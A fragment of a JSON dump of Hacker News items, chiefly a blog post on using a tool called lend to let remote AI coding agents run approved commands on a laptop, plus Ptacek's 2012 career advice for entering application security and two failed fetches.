+   "url": "https://blog.antonio.cx/running-agents-with-lend",
+   "hn_url": "https://news.ycombinator.com/item?id=50526152",
+   "published": "2026-11-17T01:18:56Z",
+   "points": 116,
+   "num_comments": 85,
+   "text": "Table of Contents\nI built lend to let remote agents use tools on my laptop with my approval. Here's how it fits into my workflow.\nBackground #\nI use agents heavily these days as part of my toolchain. I usually have a few going at once: Claude Code working in one repo, Codex reviewing a branch in another, and something long-running in the background. I often have them review each other's work too. None of them run on my laptop. They run on VMs I can throw away, and my laptop keeps the stuff I care about: my SSH keys, my 1Password vault, and the gh and cloud CLIs that are logged in as me.\nI run those agents on picd, our hosting service at pico.sh. It gives me my own VM with a Docker engine and a shell over SSH. I run herdr and the agents there, and my home directory persists across restarts so my dotfiles and tools stay in place.\nThis works great until an agent needs something on my laptop. In this post I'll go over how I run agents in parallel with herdr and Ovis, and the tool I wrote to deal with credentials, lend.\nherdr #\nherdr is a terminal multiplexer built for coding agents. You get the usual workspaces, tabs, and panes, and it also knows which agent is running in each pane and what it's doing. The sidebar shows whether each agent is working, waiting on me, or done, so I can tell at a glance which one needs attention.\nThe CLI talks to the running session, so agents can drive each other. An agent can start Codex in another pane, give it a prompt, wait for it to finish, and read what it said:\n1herdr agent start reviewer --kind codex --pane \"$PANE\"\n2herdr agent prompt reviewer \"Review the diff on am/fix-retries\" --wait --until done\n3herdr agent read reviewer --source recent\nRemote hosts work the same way. herdr machine add agent-vm sets up herdr on the VM and adds its sessions to my local client. Those sessions keep running after I disconnect.\nOvis #\nOvis is a browser and phone client for herdr. It shows each agent's transcript as a chat, with the live terminal a tap away. When an agent asks for approval or has a question, Ovis turns it into a card I can answer and sends me a push notification. It picks up the machines saved in herdr, so my VMs show up without any extra setup. I reach it over Tailscale.\nIf an agent gets stuck on a question while I'm away from my desk, I answer it from my phone and the other agents keep going.\nThe credential problem #\nAgents on a VM still need to act as me. I use them to monitor CI with gh, call APIs with tokens from 1Password, and SSH into other hosts. There are two usual ways to make that work, and I don't love either of them.\nThe first is copying credentials onto the VM. A token in ~/.config/gh/hosts.yml can be read by every process on that machine, including the agent and anything it runs, for as long as the token is valid.\nThe second is forwarding my SSH agent with ssh -A. The private keys stay on my laptop, but the VM can use every key in the agent without asking and without any record of what it signed. It also only covers SSH keys.\nWhat I wanted was for the credentials to stay on the laptop and for the commands that need them to run there too. The agent asks to run something, I approve it with Touch ID, and the agent gets the output back.\nlend #\nThat's where lend comes in. lend is a proxy that sits in front of your existing SSH agent, and you forward its socket in place of the real one. SSH and Git keep working like normal, and lend adds a way to run commands through an SSH agent extension.\nWhen an agent on the VM asks to run gh, the request goes over the socket and gh runs on my laptop with my login. The token never leaves the laptop, so the agent never has it. Every request, whether it's a signature or a command, is checked against a policy on the laptop and needs my approval before anything happens.\n1Remote: lend exec -- command args\n2                  |\n3          forwarded SSH agent socket\n4                  |\n5Laptop: lend agent -> policy + local approval -> local command\n6                                           -> original SSH agent (signing)\nThe policy lives on the laptop and lists what the VM is allowed to ask for. Everything else is denied. Mine is pretty short:\n 1{\n 2  \"default\": \"deny\",\n 3  \"commands\": [\n 4    {\"executable\": \"/opt/homebrew/bin/gh\", \"approval\": \"biometric:inline\"}\n 5  ],\n 6  \"ssh\": {\n 7    \"default\": \"deny\",\n 8    \"keys\": [\n 9      {\"fingerprint\": \"SHA256:...\", \"approval\": \"biometric:inline\"}\n10    ]\n11  }\n12}\nA rule can also take an args_prefix like [\"pr\", \"view\"] if you only want to allow some subcommands. biometric:inline puts Touch ID right in the request dialog, so I read the request and touch once to approve it. Plain biometric asks for Touch ID in a second prompt after I click Allow.\nTo connect, I run lend ssh from the laptop. It starts a proxy for that one connection and stops it when SSH exits:\n1lend ssh --config ./policy.json -- agent-vm\nI run herdr on the VM. Claude Code talks to lend through lend mcp, an MCP server with a single tool called run_local_command. The tool takes the command to run and a reason, and the reason is required:\n1{\n2  \"mcpServers\": {\n3    \"laptop\": {\"command\": \"lend\", \"args\": [\"mcp\"]}\n4  }\n5}\nHere I asked Claude Code on the VM for the lend repo's description. It called the tool with gh repo view, my Mac showed the request, and one touch approved it:\nThe dialog shows the full path to the executable, every argument, the directory it'll run in on the laptop, the reason, and what the remote process said about itself. Once I approve, gh runs on the laptop and stdout, stderr, and the exit code stream back to the agent. The reason and caller details come from the VM, so they're marked as unverified. They're there to help me decide and can't change what the policy allows.\nIf you'd rather skip MCP, the same request works as a plain CLI call on the VM:\n1lend exec --reason \"Read the repo description\" -- gh repo view antoniomika/lend\nKeeping the socket stable across reconnects #\nherdr panes survive an SSH disconnect, but the forwarded socket belongs to that connection. When I reconnect, SSH gives me a new socket path. Agents still running in the panes keep the old SSH_AUTH_SOCK.\nI use a symlink at a fixed path and update it from ~/.ssh/rc on the VM. SSH runs this before starting the shell, so it sees the socket forwarded by the new connection:\n 1#!/bin/sh\n 2\n 3if [ -n \"${SSH_AUTH_SOCK:-}\" ] &&\n 4    [ \"$SSH_AUTH_SOCK\" != \"$HOME/.ssh/lend/agent.sock\" ] &&\n 5    \"$HOME/.local/bin/lend\" doctor --remote --socket \"$SSH_AUTH_SOCK\" --timeout 1s >/dev/null 2>&1; then\n 6  install -d -m 700 \"$HOME/.ssh/lend\" &&\n 7    ln -sfn -- \"$SSH_AUTH_SOCK\" \"$HOME/.ssh/lend/agent.sock\"\n 8fi\n 9\n10if [ -n \"${DISPLAY:-}\" ] && read -r _ssh_proto _ssh_cookie; then\n11  case $DISPLAY in\n12    localhost:*) _ssh_display=\"unix:${DISPLAY#localhost:}\" ;;\n13    *) _ssh_display=$DISPLAY ;;\n14  esac\n15  printf 'add %s %s %s\\n' \"$_ssh_display\" \"$_ssh_proto\" \"$_ssh_cookie\" | /usr/bin/xauth -q -\n16fi\nThe check confirms the forwarded socket speaks lend before updating the link. The directory is private to my user and keeps this link separate from other agent sockets. I use lend's absolute path because this runs before my shell adds ~/.local/bin to PATH. The X11 block handles cookie setup, which SSH delegates to this file when it exists.\nMy ~/.bashrc checks the stable path before exporting it:\n1if [ -S \"$HOME/.ssh/lend/agent.sock\" ] &&\n2    \"$HOME/.local/bin/lend\" doctor --remote --socket \"$HOME/.ssh/lend/agent.sock\" --timeout 1s >/dev/null 2>&1; then\n3  export SSH_AUTH_SOCK=\"$HOME/.ssh/lend/agent.sock\"\n4fi\nNew Bash shells in herdr panes pick up the stable path when it works. If the check fails, Bash leaves SSH_AUTH_SOCK alone. MCP, approval hooks, and Git inherit that path when I start them. After reconnecting, the SSH hook updates the symlink and those processes use the new socket for subsequent requests. Agents already running with an old socket path need to be restarted once with the stable path in their environment.\nThe SSH connection from the laptop still has to stay open. Requests fail while it's disconnected, and reconnecting starts a new lend session with fresh approvals and leases. The link points at one connection at a time, so the last update wins.\nSecrets the agent never sees #\ngh works because it's already logged in on my laptop. Some tools need a token passed in. For those, a command rule can read secrets with something like op read and hand them to the approved command as environment variables:\n 1{\n 2  \"secret_reader\": \"/opt/homebrew/bin/op\",\n 3  \"secret_reader_args\": [\"read\", \"--no-newline\"],\n 4  \"commands\": [\n 5    {\n 6      \"executable\": \"/opt/homebrew/bin/gh\",\n 7      \"args_prefix\": [\"pr\", \"view\"],\n 8      \"approval\": \"biometric\",\n 9      \"secrets\": {\"GH_TOKEN\": \"op://Development/github/token\"}\n10    }\n11  ]\n12}\nWhen the agent asks to run gh pr view and I approve it, lend reads the token from 1Password, runs gh with GH_TOKEN set, and sends back the output. The token stays on the laptop. The VM can't pick which variables get set or which references get read. The prompt shows the variable names and references, and the values never show up in prompts or history.\nHere's the VM running gh api user with a rule that injects GH_TOKEN. After I approve in lend, 1Password asks for its own Touch ID before op read returns the token. The VM gets my login back, and its own environment has no GH_TOKEN:\nThere's one catch: this only works if the approved command doesn't print its environment. If you approve env or sh, you've handed the values right back. The same goes for allowing op itself as a command, since op read prints the secret and that output goes straight to the agent.\nSSH keys #\nKeys get their own policy too. Keys that aren't listed are hidden from the VM, and listed keys can be limited by what they're allowed to sign. max_signatures caps how many signatures a key can make in a session.\nLeases #\nA rule can offer a lease when I approve, like five minutes or three uses. Leases only exist inside a lend ssh session and only match the exact command and arguments I approved. They go away when the session ends or my screen locks.\nSeeing what happened #\nlend status --all --watch shows what's connected, what's waiting, what's running, and any active leases. lend pause --all cancels everything and refuses new requests until I resume. lend history keeps a record of what ran and how it was approved. It leaves out arguments, output, and secrets, and you can opt into logging arguments.\nAnswering agent prompts from the laptop #\nAgents also ask permission for things that have nothing to do with my credentials, like running a shell command on the VM, editing a file, or fetching a URL. lend approve sends those questions to the same dialog on my Mac. It doesn't run anything on the laptop. It asks me, and the agent decides what to do with the answer.\nFor Claude Code, it's a PermissionRequest hook on the VM:\n1{\n2  \"hooks\": {\n3    \"PermissionRequest\": [\n4      {\"matcher\": \"*\", \"hooks\": [{\"type\": \"command\", \"command\": \"lend approve --hook claude-code\"}]}\n5    ]\n6  }\n7}\nNow when Claude Code would normally stop and ask in the terminal, my Mac shows the command or tool input and I answer with Touch ID. The laptop policy lists which topics are allowed to ask, each with its own approval:\n1\"approvals\": {\n2  \"topics\": [{\"name\": \"claude-code\", \"approval\": \"biometric:inline\"}]\n3}\nThere are adapters for Codex, Antigravity, and pi, plus a plain JSON format for anything else. You can use it in scripts too: lend approve --topic deploy --title \"terraform apply\" && terraform apply only applies after I approve on the laptop. If the laptop can't be reached, the hook stays out of the way and the agent asks in its own UI like it normally would.\nWhat lend doesn't protect against #\nAn approved command runs as my user and can touch my files. Approval decides what runs, and lend doesn't sandbox it. If I approve a shell, an interpreter, or anything [...truncated]"
+  },
+  {
+   "id": "hn:50509416",
+   "section": "news",
+   "source": "Hacker News",
+   "title": "Eclipse Mosquitto – An open source MQTT broker",
+   "url": "https://github.com/eclipse-mosquitto/mosquitto",
+   "hn_url": "https://news.ycombinator.com/item?id=50509416",
+   "published": "2026-11-15T18:36:40Z",
+   "points": 111,
+   "num_comments": 42,
+   "text": "(article fetch failed: 403 Client Error: Forbidden for url: https://github.com/eclipse-mosquitto/mosquitto)"
+  },
+  {
+   "id": "hn:50524225",
+   "section": "news",
+   "source": "Hacker News",
+   "title": "How to Break into Security, Ptacek Edition (2012)",
+   "url": "https://krebsonsecurity.com/2012/06/how-to-break-into-security-ptacek-edition/",
+   "hn_url": "https://news.ycombinator.com/item?id=50524225",
+   "published": "2026-11-16T22:19:23Z",
+   "points": 111,
+   "num_comments": 27,
+   "text": "At least once a month, sometimes more, readers write in to ask how they can break into the field of computer security. Some of the emails are from people in jobs that have nothing to do with security, but who are fascinated enough by the field to contemplate a career change. Others are already in an information technology position but are itching to segue into security. I always respond with my own set of stock answers, but each time I do this, I can’t help but feel my advice is incomplete, or at least not terribly well-rounded.\nI decided to ask some of the brightest minds in the security industry today what advice they’d give. Almost everyone I asked said they, too, frequently get asked the very same question, but each had surprisingly different takes on the subject. Today is the first installment in a series of responses to this question. When the last of the advice columns have run, I’ll create an archive of them all that will be anchored somewhere prominently on the home page. That way, the next time someone asks how they can break into security, I’ll have more to offer than just my admittedly narrow perspectives on the matter.\nLast month, I interviewed Thomas Ptacek, founder of Matasano Security, about how companies could beef up password security in the wake of a week full of news about password leaks at LinkedIn and other online businesses. Ptacek’s provocative advice generated such a huge amount of reader interest and further discussion that I thought it made sense to begin this series with his thoughts:\nPtacek: “Information security is one of the most interesting, challenging, and, if you do it carefully, rewarding fields in the technology industry. It’s one of the few technology jobs where the most fun roles are well compensated. If you grew up dreaming of developing games, the laws of supply and demand teach a harsh lesson early in your career: game development jobs are often tedious and usually pay badly. But if you watched “Sneakers” and ideated a life spent breaking or defending software, great news: infosec can be more fun in real life, and it’s fairly lucrative.\nI’m a software developer. I try to look at security through the lens of computer science. To me, the most attractive thing about the field is the opportunity it provides to work with lots of different concepts at lots of different levels. Computer security might be the best way to work professionally with compiler theory, or to spend time understanding computer microarchitecture, or to apply advanced mathematics.\nOther people get involved in security for different reasons, and those reasons are probably equally valid. Some people really like the “good guys / bad guys” narrative that comes with security. Some people see security as an opportunity to save the world. Other people are drawn to the competitive nature of the field: at the higher levels, it really is a cat-and-mouse game. It also comes closer to meritocracy than most of technology: you can either break in or you can’t; your defenses either work or they don’t.\nBut for me, it’s just one of the best development jobs you can get, and with that in mind, here’s my advice for people interested in pursuing a career in it.\nFirst: I want you to learn how to program. Clearly, you can get through college and get a good-paying steady job without ever learning to love programming. But no one factor gives you as much control over your career, as much of an ability to write your own ticket, as the ability to solve problems using programming languages. A lot of very smart technology professionals have concluded that they just don’t enjoy writing software. Those people should reconsider. Try different languages, or different application domains, but find a way to make programming stick in your head.\nSecond: the best jobs in our field are in application security. You can get good steady work designing firewall deployments, setting up desktop agents, or responding to incidents. But all those roles are fundamentally reacting to what’s happening in appsec. The next generation of security products — along with the org charts of security teams at the savviest companies — are being designed now, by accident, by application security practitioners.\nAppsec roles are roles that involve attacking software or devising fixes and countermeasures for those attacks. Two good ways to “come up” in appsec: become a penetration tester, or contribute to (or start) a secure software development practice in your company.\nA good way to move into penetration testing: grab some industry standard tools and use an Amazon EC2 account to set up a “shooting range” to attack. Some of the best-known tools are available for free: the Nessus scanner, for instance, while not an application security tool, is free and can land you a network penetration testing role that you can use as a springboard to breaking applications.\nWhen people reach out to Matasano asking how to get a foot in the door attacking software, we have a few simple steps to offer:\n0. Learn to love programming in at least one language. The C Programming Language has the most cachet in application security, but for this step-by-step list, Java or Python or Ruby will do fine.\n1. Grab a copy of The Web Application Hacker’s Handbook.\n2. Go to the “previous releases” archive at WordPress.org and grab very old versions of WordPress; install them at EC2.\n3. Download OWASP WebScarab or Burp Suite Free Edition, both of which are free, and use them to find bugs in ancient WordPress.\nIf you’re already in an IT role, and want to come up on the defensive side of appsec, try to position yourself near custom software development. Most large firms build “line of business” applications. As a rule, building “line of business” isn’t particularly fun. But defending those apps can be; sometimes, the most boring applications turn out to be surprisingly sensitive.\nAnd the good news for doing appsec in BigCo’s: most companies have very immature security programs. If you can get a role in QA, or in what the cool kids are calling “DevOps”, you can end up with a lot of influence in security. At Matasano, we’ve watched lots of ops people successfully transition to appsec and senior security management just by instituting basic security testing processes on their company’s software.\nTo me, the whole field boils down to studying, understanding, and manipulating technology. Like most software security practices, we’ve gotten our hands dirty with a fascinating cross-section of the whole technology industry. We’ve written attack tools that target the control registers of device chipsets, we’ve done custom RF work, we’ve written low-level debuggers for different CPU architectures, and we’ve seen and beaten up on products built in almost every programming language and every platform you can imagine. If crawling through the ventilation ducts of the world’s most important technology is something you think might make you tick like we do… well, appsec! Learn to code. Spend a couple days Starbucks money on an EC2 account and deploy some broken apps to break. Find opportunities to practice in your job.\nAnd, uh, come talk to us? People like you are hard to find!”"
+  },
+  {
+   "id": "hn:50515182",
+   "section": "news",
+   "source": "Hacker News",
+   "title": "Winudf – DVD / BluRay driver for DOS, Windows 1.x – 3x / 95 / 98 / ME",
+   "url": "https://github.com/ages2001/WINUDF",
+   "hn_url": "https://news.ycombinator.com/item?id=50515182",
+   "published": "2026-11-16T08:00:13Z",
+   "points": 97,
+   "num_comments": 20,
+   "text": "(article fetch failed: 403 Client Error: Forbidden for url: https://github.com/ages2001/WINUDF)"
+  }
+ ]
+}
